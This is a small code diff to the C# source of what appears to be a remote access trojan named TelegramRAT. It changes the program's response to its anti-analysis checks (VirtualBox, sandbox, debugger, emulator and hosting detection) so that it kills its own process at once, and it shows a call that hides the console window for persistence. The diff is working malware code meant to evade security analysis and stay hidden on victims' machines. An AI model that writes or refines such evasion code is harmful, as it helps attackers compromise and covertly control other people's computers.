@@ -8,6 +8,7 @@
 
 
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
@@ -23,7 +24,7 @@ namespace TelegramRAT
         {
             if (AntiAnalysis.VirtualBox.Check() == true || AntiAnalysis.SandBox.Check() == true || AntiAnalysis.Debugger.Check() == true || AntiAnalysis.Emulator.Check() == true || AntiAnalysis.Hosting.Check() == true)
             {
-                Application.Exit();
+                Process.GetCurrentProcess().Kill();
             }
             // Hide console
             persistence.HideConsoleWindow();
